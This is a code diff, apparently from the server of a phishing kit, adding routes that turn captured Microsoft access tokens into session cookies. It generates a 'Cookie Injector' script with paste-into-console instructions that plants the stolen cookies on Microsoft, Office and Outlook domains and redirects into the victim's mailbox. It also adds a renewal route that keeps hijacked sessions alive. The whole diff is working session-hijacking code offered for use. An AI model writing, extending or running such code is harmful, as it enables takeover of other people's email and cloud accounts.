@@ -86,25 +86,86 @@ router.delete('/:id', userAuth, async (req, res) => {
   }
 });
 
-// Generate cookie script from stored cookies
+// Generate cookie script - auto-converts from access_token if no cookies stored
 router.get('/:id/cookie-script', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
     
-    const cookies = decrypt(tokens[0].cookies_encrypted);
-    if (!cookies) return res.status(400).json({ error: 'No cookies available for this capture' });
+    const token = tokens[0];
     
-    // Generate document.cookie script
+    // First try to get stored cookies
+    let cookies = decrypt(token.cookies_encrypted);
+    
+    // If no stored cookies, try to convert from access_token
+    if ((!cookies || cookies.trim() === '') && token.access_token_encrypted) {
+      const accessToken = decrypt(token.access_token_encrypted);
+      if (accessToken) {
+        try {
+          const cookieConverter = require('../services/cookieconverter');
+          const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type);
+          if (result.success && result.cookies) {
+            cookies = result.cookies;
+            // Save cookies for later use
+            await db.query(
+              'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
+              [encrypt(cookies), 'cookie', token.id]
+            );
+          }
+        } catch (convErr) {
+          console.error('[Tokens] Cookie conversion error:', convErr.message);
+        }
+      }
+    }
+    
+    if (!cookies || cookies.trim() === '') {
+      return res.status(400).json({ 
+        error: 'No cookies available. Please use the Renew button to convert tokens to cookies first.',
+        has_access_token: !!token.access_token_encrypted
+      });
+    }
+    
+    // Generate document.cookie script with proper formatting
     const cookieArray = cookies.split(';').map(c => c.trim()).filter(c => c);
-    const script = cookieArray.map(c => {
-      const [name, ...valueParts] = c.split('=');
-      return `document.cookie = "${name.trim()}=${valueParts.join('=').trim()}; path=/; secure; SameSite=None";`;
-    }).join('\n');
     
-    res.json({ script, cookie_count: cookieArray.length });
+    // Build a complete script with domain and path attributes
+    const lines = [
+      '// VGenius Cookie Injector for Microsoft Login',
+      '// Instructions:',
+      '// 1. Open https://login.microsoftonline.com in Chrome/Edge',
+      '// 2. Press F12 -> Go to Console tab',
+      '// 3. Paste this script and press Enter',
+      '// 4. Wait ~3 seconds for redirect',
+      ''
+    ];
+    
+    // Generate cookie injection lines
+    cookieArray.forEach(c => {
+      const [name, ...valueParts] = c.split('=');
+      const cookieName = name.trim();
+      const cookieValue = valueParts.join('=').trim();
+      if (cookieName && cookieValue) {
+        lines.push(`document.cookie = "${cookieName}=${cookieValue}; path=/; domain=.microsoft.com; secure; SameSite=None";`);
+        lines.push(`document.cookie = "${cookieName}=${cookieValue}; path=/; domain=.office.com; secure; SameSite=None";`);
+        lines.push(`document.cookie = "${cookieName}=${cookieValue}; path=/; domain=outlook.office365.com; secure; SameSite=None";`);
+      }
+    });
+    
+    // Add redirect
+    lines.push('');
+    lines.push('console.log("✅ All cookies injected! Redirecting to Outlook...");');
+    lines.push('setTimeout(() => { window.location.href = "https://outlook.office365.com/"; }, 1500);');
+    
+    const script = lines.join('\n');
+    
+    res.json({ 
+      script, 
+      cookie_count: cookieArray.length,
+      cookies: cookieArray 
+    });
   } catch (err) {
-    res.status(500).json({ error: 'Server error' });
+    console.error('[Tokens] Cookie script error:', err);
+    res.status(500).json({ error: 'Failed to generate script' });
   }
 });
 
@@ -114,11 +175,43 @@ router.post('/:id/renew', userAuth, async (req, res) => {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
     
-    const sessionKeeper = require('../services/sessionkeeper');
-    const result = await sessionKeeper.renewSingleCapture(tokens[0]);
+    const token = tokens[0];
     
-    res.json(result);
+    // Decrypt access_token
+    const accessToken = decrypt(token.access_token_encrypted);
+    if (!accessToken) {
+      return res.status(400).json({ error: 'No access token available for renewal' });
+    }
+    
+    // Use cookie converter to generate cookies from access_token
+    const cookieConverter = require('../services/cookieconverter');
+    const result = await cookieConverter.convertTokensToCookies(
+      accessToken, 
+      token.template_type,
+      '', // tenant
+      ''  // email
+    );
+    
+    if (result.success && result.cookies) {
+      // Update the token with converted cookies
+      await db.query(
+        'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, expiration = DATE_ADD(NOW(), INTERVAL 24 HOUR), last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
+        [encrypt(result.cookies), 'cookie', token.id]
+      );
+      
+      res.json({ 
+        success: true, 
+        cookies: result.cookies,
+        cookie_count: result.cookies.split(';').filter(c => c.trim()).length
+      });
+    } else {
+      res.status(400).json({ 
+        error: result.error || 'Conversion failed',
+        success: false
+      });
+    }
   } catch (err) {
+    console.error('[Tokens] Renewal error:', err);
     res.status(500).json({ error: 'Renewal failed: ' + err.message });
   }
 });
